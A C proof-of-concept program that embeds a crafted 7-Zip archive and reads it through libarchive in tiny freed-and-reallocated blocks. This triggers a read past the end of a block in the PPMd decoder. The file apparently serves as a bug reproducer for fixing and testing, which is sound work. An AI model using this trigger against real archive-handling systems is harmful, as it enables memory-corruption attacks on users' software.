/*
 * PoC: 7-Zip PPMd stream read past the end of a packed-data block.
 *
 * Reads a minimal valid 7-Zip archive containing one PPMd-coded entry
 * through the public archive_read API.  The custom read callback hands
 * the archive to libarchive in small, separately allocated blocks so
 * that the PPMd byte reader has to refill across a block boundary.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "archive.h"
#include "archive_entry.h"

static const unsigned char archive_data[] = {
	0x37, 0x7a, 0xbc, 0xaf, 0x27, 0x1c, 0x00, 0x03, 0x54, 0xe1, 0xae, 0xac, 0x40, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xdb, 0x10, 0x93, 0x28,
	0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,
	0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f,
	0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2a, 0x2b, 0x2c, 0x2d, 0x2e, 0x2f,
	0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3a, 0x3b, 0x3c, 0x3d, 0x3e, 0x3f,
	0x01, 0x04, 0x06, 0x00, 0x01, 0x09, 0x40, 0x00, 0x07, 0x0b, 0x01, 0x00, 0x01, 0x23, 0x03, 0x04,
	0x01, 0x05, 0x06, 0x00, 0x00, 0x10, 0x00, 0x0c, 0x64, 0x00, 0x08, 0x0a, 0x01, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x05, 0x01, 0x11, 0x07, 0x00, 0x61, 0x00, 0x61, 0x00, 0x00, 0x00, 0x00, 0x00,
};

struct block_source {
	const unsigned char *data;
	size_t size;
	size_t pos;
	size_t block_size;
	void *block;
};

static la_ssize_t
block_read(struct archive *a, void *client_data, const void **buff)
{
	struct block_source *src = (struct block_source *)client_data;
	size_t remaining, count;

	(void)a;
	free(src->block);
	src->block = NULL;
	if (src->pos >= src->size)
		return (0);
	remaining = src->size - src->pos;
	count = remaining < src->block_size ? remaining : src->block_size;
	src->block = malloc(count);
	if (src->block == NULL)
		return (-1);
	memcpy(src->block, src->data + src->pos, count);
	src->pos += count;
	*buff = src->block;
	return ((la_ssize_t)count);
}

static int64_t
block_seek(struct archive *a, void *client_data, int64_t offset, int whence)
{
	struct block_source *src = (struct block_source *)client_data;
	int64_t base, target;

	(void)a;
	switch (whence) {
	case SEEK_SET: base = 0; break;
	case SEEK_CUR: base = (int64_t)src->pos; break;
	case SEEK_END: base = (int64_t)src->size; break;
	default: return (-1);
	}
	target = base + offset;
	if (target < 0 || target > (int64_t)src->size)
		return (-1);
	src->pos = (size_t)target;
	return (target);
}

int
main(void)
{
	struct block_source src;
	struct archive *a;
	struct archive_entry *entry;
	char buffer[4096];
	la_ssize_t bytes_read;

	memset(&src, 0, sizeof(src));
	src.data = archive_data;
	src.size = sizeof(archive_data);
	src.block_size = 4;

	a = archive_read_new();
	if (a == NULL)
		return (1);
	archive_read_support_format_7zip(a);
	archive_read_support_filter_all(a);
	archive_read_set_read_callback(a, block_read);
	archive_read_set_seek_callback(a, block_seek);
	archive_read_set_callback_data(a, &src);
	if (archive_read_open1(a) != ARCHIVE_OK) {
		fprintf(stderr, "open failed: %s\n", archive_error_string(a));
		archive_read_free(a);
		return (1);
	}
	while (archive_read_next_header(a, &entry) == ARCHIVE_OK) {
		while ((bytes_read = archive_read_data(a, buffer,
		    sizeof(buffer))) > 0)
			;
		if (bytes_read < 0)
			fprintf(stderr, "read failed: %s\n",
			    archive_error_string(a));
	}
	archive_read_free(a);
	free(src.block);
	return (0);
}
